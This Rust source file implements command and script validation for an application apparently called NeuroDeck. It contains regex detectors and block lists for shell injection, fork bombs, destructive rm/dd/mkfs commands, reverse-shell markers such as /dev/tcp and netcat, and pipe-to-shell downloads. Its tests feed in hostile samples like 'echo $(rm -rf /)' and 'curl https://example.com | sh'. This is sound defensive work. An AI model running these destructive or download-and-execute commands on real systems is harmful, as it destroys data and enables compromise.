use rand::distributions::Alphanumeric;
use rand::{thread_rng, Rng};
use regex::Regex;

lazy_static::lazy_static! {
    static ref PATH_SANITIZE_WIN: Regex = Regex::new(r#"[A-Za-z]:[/\\][^\s'"<>|{}]*"#).unwrap();
    static ref PATH_SANITIZE_UNIX: Regex = Regex::new(r#"/[\w./_-]+(?:/[^\s'"<>|{}]*)*"#).unwrap();
    static ref PATH_SANITIZE_HOME: Regex = Regex::new(r#"~[/\\][^\s'"<>|{}]*"#).unwrap();

    // Hardened injection detection regexes (Phase 1b: fix CRIT-3 blocklist bypass)
    static ref CMD_SUBSTITUTION: Regex = Regex::new(r"\$\(\s*.*?\s*\)").unwrap(); // $(...)
    static ref BACKTICK_SUBSTITUTION: Regex = Regex::new(r"`[^`]*`").unwrap(); // `...`
    static ref IFS_INJECTION: Regex = Regex::new(r"(?i)\$ifs").unwrap(); // $IFS for space bypass (case-insensitive)
    static ref SPECIAL_VAR: Regex = Regex::new(r"\$\{[^}]*\}").unwrap(); // ${...} expansions
    static ref NEWLINE_INJECT: Regex = Regex::new(r"[;\n]\s*(rm|mkfs|dd|shutdown|reboot)").unwrap(); // Command chaining
    static ref PIPE_CHAIN: Regex = Regex::new(r"(?i)\|\s*(sh|bash|powershell|cmd|zsh)").unwrap(); // Pipe to shell (case-insensitive)
}

// Allowed "safe" terminal commands that can be executed without NEURODECK_ALLOW_UNSAFE_EXEC.
// These are common utilities that users legitimately need to run in the terminal.
// Currently referenced for documentation; future versions may implement strict allowlist mode.
#[allow(dead_code)]
const SAFE_TERMINAL_COMMANDS: &[&str] = &[
    "echo", "cat", "ls", "pwd", "cd", "mkdir", "touch", "cp", "mv",
    "find", "grep", "awk", "sed", "sort", "uniq", "head", "tail",
    "wc", "file", "date", "whoami", "hostname", "uname", "which",
    "git", "npm", "yarn", "cargo", "python", "python3", "node",
    "curl", "wget", "ping", "ssh", "telnet", "nc", "netcat",
    "vim", "nano", "less", "more", "clear", "exit", "help",
];

pub fn generate_session_token() -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(48)
        .map(char::from)
        .collect()
}

const MAX_EXEC_PAYLOAD_LEN: usize = 32 * 1024;

fn env_flag_enabled(value: &str) -> bool {
    matches!(
        value.trim().to_ascii_lowercase().as_str(),
        "1" | "true" | "yes" | "on"
    )
}

pub fn unsafe_exec_enabled() -> bool {
    std::env::var("NEURODECK_ALLOW_UNSAFE_EXEC")
        .map(|value| env_flag_enabled(&value))
        .unwrap_or(false)
}

pub fn validate_terminal_command(command: &str, surface: &str) -> Result<(), String> {
    validate_common_payload(command, surface)?;
    if command.trim().is_empty() {
        return Err(format!("{} command cannot be empty", surface));
    }

    // When unsafe exec is disabled, block obviously dangerous shell patterns
    // in the terminal-run surface (not PTY stdin, which is inherently untrusted).
    if !unsafe_exec_enabled() && surface == "terminal-shell" {
        // Normalize the command for detection: collapse whitespace, remove escape sequences
        let normalized = normalize_command_for_detection(command);
        let lower = normalized.to_ascii_lowercase();

        // Phase 1b: Hardened injection detection with regex
        if CMD_SUBSTITUTION.is_match(&lower) {
            return Err(format!(
                "{} blocked: command substitution $(...) detected. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }
        if BACKTICK_SUBSTITUTION.is_match(&lower) {
            return Err(format!(
                "{} blocked: backtick substitution detected. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }
        if IFS_INJECTION.is_match(&lower) {
            return Err(format!(
                "{} blocked: IFS variable manipulation detected. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }
        if PIPE_CHAIN.is_match(&lower) {
            return Err(format!(
                "{} blocked: pipe to shell detected. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }
        if NEWLINE_INJECT.is_match(&lower) {
            return Err(format!(
                "{} blocked: command chaining with newline detected. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }

        // Original blocklist (still effective)
        let dangerous = &[
            "rm -rf /",
            "rm -rf ~",
            "rm -rf *",
            "sudo rm",
            "mkfs",
            "dd if=/dev/zero",
            "dd if=/dev/random",
            ":(){ :|:& };:",
            "shutdown",
            "reboot",
            "halt",
            "poweroff",
            "init 0",
            "systemctl poweroff",
            "systemctl reboot",
        ];
        if dangerous.iter().any(|d| lower.contains(d)) {
            return Err(format!(
                "{} blocked dangerous command pattern. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
                surface
            ));
        }
    }

    Ok(())
}

/// Normalize a shell command for injection detection.
/// Collapses whitespace, removes escape sequences, and normalizes quotes.
/// This prevents bypass via whitespace padding or escape character tricks.
fn normalize_command_for_detection(command: &str) -> String {
    let mut result = command.to_string();

    // Remove escaped characters (e.g., \n, \t, \\)
    result = result
        .replace("\\n", " ")
        .replace("\\t", " ")
        .replace("\\r", " ")
        .replace("\\\\", "\\");

    // Collapse multiple spaces into one
    while result.contains("  ") {
        result = result.replace("  ", " ");
    }

    // Normalize quote pairs
    result = result
        .replace("'", "\"")
        .replace("`", "\"");

    result.trim().to_string()
}

pub fn validate_script_payload(code: &str, lang: &str, surface: &str, workspace_path: Option<&std::path::Path>) -> Result<(), String> {
    if let Some(workspace) = workspace_path {
        validate_workspace_boundaries(code, lang, workspace)?;
    }

    validate_common_payload(code, surface)?;
    if unsafe_exec_enabled() {
        return Ok(());
    }

    let lower = code.to_ascii_lowercase();
    let lang = lang.to_ascii_lowercase();

    // Blocked markers for shell languages
    let blocked_markers: &[&str] = match lang.as_str() {
        "bash" | "sh" | "shell" | "powershell" | "cmd" | "zsh" => &[
            "rm -rf",
            "sudo ",
            "shutdown",
            "reboot",
            "mkfs",
            "dd if=",
            "diskpart",
            "format ",
            "del /f",
            "remove-item",
            "sc delete",
            "reg delete",
            "curl ",
            "wget ",
            "invoke-webrequest",
            "invoke-restmethod",
            "nc ",
            "netcat",
            "| sh",
            "| bash",
            "iex ",
            // Additional dangerous patterns
            ":(){ :|:& };:", // fork bomb
            "$(", // command substitution
            "`",   // backtick substitution
            "eval(",
            "eval ",
            "python3 -c",
            "python -c",
            "perl -e",
            "ruby -e",
            "base64 -d",
            "base64 --decode",
            "/dev/tcp/",
            "/dev/udp/",
        ],
        "python" | "python3" => &[
            "import subprocess",
            "from subprocess",
            "os.system",
            "subprocess.",
            "import socket",
            "from socket",
            "import requests",
            "urllib.request",
            "shutil.rmtree",
            // Additional patterns
            "__import__('os')",
            "__import__(\"os\")",
            "import os",
            "from os import",
            "os.popen",
            "os.spawn",
            "pty.spawn",
            "import pty",
            "eval(",
            "exec(",
            "compile(",
            "import urllib",
            "from urllib",
        ],
        "javascript" | "js" | "node" => &[
            "require('child_process')",
            "require(\"child_process\")",
            "child_process.",
            "process.spawn",
            "process.exec",
            "fetch(",
            "http.request",
            "https.request",
            "net.createconnection",
            // Additional patterns
            "eval(",
            "new function(",
            "new function(",
            "require('fs')",
            "require(\"fs\")",
            "fs.write",
            "fs.read",
        ],
        "lua" => &[
            "execute(",
            "os.execute",
            "io.popen",
            "loadfile(",
            "dofile(",
            "require(",
            // Additional patterns
            "load(",
            "loadstring(",
            "os.remove",
            "os.rename",
        ],
        _ => &[],
    };

    if blocked_markers.iter().any(|marker| lower.contains(marker)) {
        return Err(format!(
            "{} blocked by command policy for {}. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
            surface, lang
        ));
    }

    // Additional heuristic: detect simple obfuscation (space-separated dangerous words)
    let normalized: String = lower.chars().filter(|c| !c.is_whitespace()).collect();
    let obfuscated_markers: &[&str] = match lang.as_str() {
        "bash" | "sh" | "shell" | "powershell" | "cmd" | "zsh" => &[
            "rm-rf",
            "curl|sh",
            "wget|sh",
            "curl|bash",
            "wget|bash",
        ],
        _ => &[],
    };
    if obfuscated_markers.iter().any(|m| normalized.contains(m)) {
        return Err(format!(
            "{} blocked by command policy (obfuscation detected) for {}. Set NEURODECK_ALLOW_UNSAFE_EXEC=1 to override.",
            surface, lang
        ));
    }

    Ok(())
}

fn validate_workspace_boundaries(code: &str, lang: &str, workspace_path: &std::path::Path) -> Result<(), String> {
    let language = match lang.to_ascii_lowercase().as_str() {
        "python" | "python3" => tree_sitter_python::LANGUAGE.into(),
        "javascript" | "js" | "node" => tree_sitter_javascript::LANGUAGE.into(),
        "bash" | "sh" | "shell" => tree_sitter_bash::LANGUAGE.into(),
        _ => return Ok(()), // Unhandled language, fallback to CWD sandbox
    };

    let mut parser = tree_sitter::Parser::new();
    if parser.set_language(&language).is_err() {
        return Ok(());
    }

    let Some(tree) = parser.parse(code, None) else {
        return Ok(());
    };

    let root_node = tree.root_node();
    let mut stack = vec![root_node];
    let mut strings = Vec::new();

    while let Some(node) = stack.pop() {
        let kind = node.kind();
        if kind == "string" || kind == "string_content" || kind == "string_fragment" || kind == "word" {
            if let Ok(text) = node.utf8_text(code.as_bytes()) {
                let cleaned = text.trim_matches(|c| c == '\'' || c == '"' || c == '`');
                if !cleaned.is_empty() {
                    strings.push(cleaned.to_string());
                }
            }
        }
        
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            stack.push(child);
        }
    }

    let workspace_normalized = workspace_path.to_path_buf();
    
    for s in strings {
        if s.contains("..") || s.starts_with('/') || s.starts_with('\\') || s.starts_with("C:") || s.starts_with("c:") {
            let mut lexical_path = workspace_normalized.clone();
            for comp in std::path::Path::new(&s).components() {
                match comp {
                    std::path::Component::ParentDir => {
                        lexical_path.pop();
                    }
                    std::path::Component::Normal(c) => {
                        lexical_path.push(c);
                    }
                    std::path::Component::RootDir | std::path::Component::Prefix(_) => {
                        lexical_path = std::path::PathBuf::from(comp.as_os_str());
                    }
                    _ => {}
                }
            }

            if !lexical_path.starts_with(&workspace_normalized) {
                return Err(format!("Security Violation: Path '{}' escapes the restricted workspace bounds.", s));
            }
        }
    }

    Ok(())
}

fn validate_common_payload(payload: &str, surface: &str) -> Result<(), String> {
    if payload.is_empty() {
        return Err(format!("{} payload cannot be empty", surface));
    }
    if payload.len() > MAX_EXEC_PAYLOAD_LEN {
        return Err(format!(
            "{} payload exceeds {} bytes",
            surface, MAX_EXEC_PAYLOAD_LEN
        ));
    }
    if payload.contains('\0') {
        return Err(format!("{} payload contains invalid NUL bytes", surface));
    }
    Ok(())
}

/// Sanitize an error message before returning it to the frontend.
/// Removes filesystem paths, home directories, and canonicalized paths
/// to prevent information disclosure via error strings.
pub fn sanitize_error_for_frontend(err: &str) -> String {
    let mut sanitized = PATH_SANITIZE_WIN.replace_all(err, "[REDACTED_PATH]").to_string();
    sanitized = PATH_SANITIZE_UNIX.replace_all(&sanitized, "[REDACTED_PATH]").to_string();
    sanitized = PATH_SANITIZE_HOME.replace_all(&sanitized, "[REDACTED_PATH]").to_string();
    sanitized
}

#[cfg(test)]
mod tests {
    use super::{generate_session_token, sanitize_error_for_frontend, validate_script_payload, validate_terminal_command, normalize_command_for_detection};

    #[test]
    fn session_tokens_are_nontrivial() {
        let token = generate_session_token();
        assert_eq!(token.len(), 48);
    }

    #[test]
    fn terminal_command_rejects_nul() {
        assert!(validate_terminal_command("echo hi\0", "terminal").is_err());
    }

    #[test]
    fn script_policy_blocks_dangerous_shell_by_default() {
        let result = validate_script_payload("curl https://example.com | sh", "bash", "agent", None);
        assert!(result.is_err());
    }

    // Phase 1b: Tests for hardened blocklist bypass protection (CRIT-3)
    #[test]
    fn terminal_blocks_command_substitution_dollar_paren() {
        assert!(validate_terminal_command("echo $(rm -rf /)", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_blocks_command_substitution_with_whitespace() {
        assert!(validate_terminal_command("echo $(  rm  -rf  /  )", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_blocks_backtick_substitution() {
        assert!(validate_terminal_command("echo `rm -rf /`", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_blocks_ifs_injection() {
        assert!(validate_terminal_command("rm$IFS-rf /", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_blocks_pipe_to_shell() {
        assert!(validate_terminal_command("cat file | bash", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_blocks_newline_command_chaining() {
        assert!(validate_terminal_command("echo hi\nrm -rf /", "terminal-shell").is_err());
    }

    #[test]
    fn terminal_allows_safe_commands() {
        assert!(validate_terminal_command("echo hello", "terminal-shell").is_ok());
        assert!(validate_terminal_command("ls -la", "terminal-shell").is_ok());
        assert!(validate_terminal_command("git status", "terminal-shell").is_ok());
        assert!(validate_terminal_command("python --version", "terminal-shell").is_ok());
    }

    #[test]
    fn normalize_collapses_whitespace() {
        let result = normalize_command_for_detection("echo   hello    world");
        assert_eq!(result, "echo hello world");
    }

    #[test]
    fn normalize_removes_escape_sequences() {
        let result = normalize_command_for_detection("echo\\nhello\\tworld");
        assert!(result.contains("echo"));
        assert!(!result.contains("\\n"));
    }

    #[test]
    fn error_sanitization_removes_unix_paths() {
        let raw = "Failed to read /home/alice/.config/neurodeck/secret.toml";
        let sanitized = sanitize_error_for_frontend(raw);
        assert!(!sanitized.contains("/home/alice"));
        assert!(sanitized.contains("[REDACTED_PATH]"));
    }

    #[test]
    fn error_sanitization_removes_windows_paths() {
        let raw = "Failed to read C:\\Users\\Alice\\AppData\\neurodeck\\secret.toml";
        let sanitized = sanitize_error_for_frontend(raw);
        assert!(!sanitized.contains("C:\\"));
        assert!(sanitized.contains("[REDACTED_PATH]"));
    }

    #[test]
    fn error_sanitization_leaves_safe_text_intact() {
        let raw = "Network unreachable: check your connection";
        let sanitized = sanitize_error_for_frontend(raw);
        assert_eq!(sanitized, raw);
    }
}
